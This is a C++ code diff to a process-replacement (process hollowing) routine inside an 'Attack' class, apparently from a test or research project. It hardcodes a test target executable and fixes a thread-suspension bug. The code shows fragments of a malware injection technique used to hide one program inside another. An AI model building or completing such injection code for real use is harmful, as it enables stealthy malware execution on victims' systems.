@@ -341,7 +341,7 @@ PE_FILE ParsePE(const char* PE)
 	return pefile;
 }
 
-BOOL ProcessReplacement(TCHAR* target, string inj_exe)
+BOOL ProcessReplacement(string inj_exe)
 {
 	std::cout << "[ ] Opening binary to read into buffer" << std::endl;
 	tuple<bool, char*, fstream::pos_type> bin = OpenBinary(inj_exe);
@@ -366,7 +366,7 @@ BOOL ProcessReplacement(TCHAR* target, string inj_exe)
 	std::cout << "[ ] Creating host process" << std::endl;
 
 	CreateProcess(
-		target,
+		L"..\\..\\test_process_folder\\target-simple-gui.exe",
 		nullptr,
 		nullptr,
 		nullptr,
@@ -384,7 +384,7 @@ BOOL ProcessReplacement(TCHAR* target, string inj_exe)
 		return FALSE;
 	}
 
-	if (SuspendThread(remoteProcessInfo->hProcess) == -1)
+	if (SuspendThread(remoteProcessInfo->hThread) == -1)
 	{
 		std::cout << "[-] Failed to stop remote process" << std::endl;
 		return FALSE;
@@ -454,7 +454,7 @@ BOOL ProcessReplacement(TCHAR* target, string inj_exe)
 	return TRUE;
 }
 
-BOOL Attack::ProcReplace(char *arg1, string arg2)
+BOOL Attack::ProcReplace(string arg1)
 {
-	return ProcessReplacement((TCHAR*)arg1, arg2);
+	return ProcessReplacement(arg1);
 }
